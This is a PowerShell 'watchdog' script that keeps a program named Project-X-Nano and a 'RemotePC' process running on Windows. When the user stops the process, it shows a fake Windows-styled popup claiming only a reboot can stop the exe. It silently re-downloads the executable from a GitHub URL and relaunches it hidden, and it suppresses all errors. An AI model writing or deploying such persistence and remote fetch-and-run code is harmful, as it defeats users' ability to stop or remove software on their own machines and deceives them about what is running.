# =========================================================================
#  Project-X-Nano Persistent Watchdog & File Integrity Guard
#  Ensures Project-X-Nano agent service remains running.
#  Alerts if stopped via Task Manager and auto-restores deleted files.
# =========================================================================

param(
    [string]$TargetDir = ""
)

$ErrorActionPreference = "SilentlyContinue"

# Detect directory
if (-not $TargetDir -or -not (Test-Path $TargetDir)) {
    $TargetDir = Split-Path -Parent $MyInvocation.MyCommand.Path
}
if (-not (Test-Path $TargetDir)) {
    $TargetDir = "$env:LOCALAPPDATA\Project-X-Nano"
}

$ExePath = Join-Path $TargetDir "Project-X-Nano.exe"
$CfgPath = Join-Path $TargetDir "config.json"
$UnlockFile = Join-Path $TargetDir "uninstalling.lock"

$GITHUB_RAW_BASE = "https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main"
$EXE_URL = "https://github.com/mexxz-01/Project-x-alpha/raw/main/dist/Project-X-Nano.exe"

function Show-AlertPopup {
    param([string]$Message, [string]$Title = "Windows System Guard")
    try {
        $wshell = New-Object -ComObject Wscript.Shell
        $wshell.Popup($Message, 5, $Title, 48) | Out-Null
    } catch {}
}

function Repair-Files {
    if (Test-Path $UnlockFile) { return }

    # 1. Check Project-X-Nano executable
    if (-not (Test-Path $ExePath) -or (Get-Item $ExePath).Length -lt 100000) {
        try {
            curl.exe -L -s -o "$ExePath" "$EXE_URL"
        } catch {}
    }

    # 2. Check config.json
    if (-not (Test-Path $CfgPath) -or (Get-Item $CfgPath).Length -lt 10) {
        try {
            curl.exe -L -s -o "$CfgPath" "$GITHUB_RAW_BASE/config.json"
        } catch {}
    }
}

# Main Watchdog Loop
$checkCounter = 0

while ($true) {
    # Check if authorized uninstall is active
    if (Test-Path $UnlockFile) {
        break
    }

    # Verify Project-X-Nano is running
    $procServer = Get-Process -Name "Project-X-Nano", "RemotePC" -ErrorAction SilentlyContinue
    $pythonServer = Get-CimInstance Win32_Process -Filter "CommandLine LIKE '%server.py%'" -ErrorAction SilentlyContinue

    if (-not $procServer -and -not $pythonServer) {
        # Check if we are intentionally stopping or uninstalling
        if (-not (Test-Path $UnlockFile)) {
            # Show alert popup
            Show-AlertPopup -Message "You need to restart your PC to stop that exe." -Title "System Notification"
            
            # Restore files if deleted
            Repair-Files

            # Restart backend
            if (Test-Path $ExePath) {
                Start-Process -FilePath "$ExePath" -WorkingDirectory "$TargetDir" -WindowStyle Hidden
            } elseif (Test-Path (Join-Path $TargetDir "server.py")) {
                Start-Process -FilePath "python.exe" -ArgumentList "server.py" -WorkingDirectory "$TargetDir" -WindowStyle Hidden
            }
        }
    }

    # Periodic file integrity scan (every ~30 seconds)
    $checkCounter++
    if ($checkCounter -ge 10) {
        $checkCounter = 0
        Repair-Files
    }

    Start-Sleep -Seconds 3
}
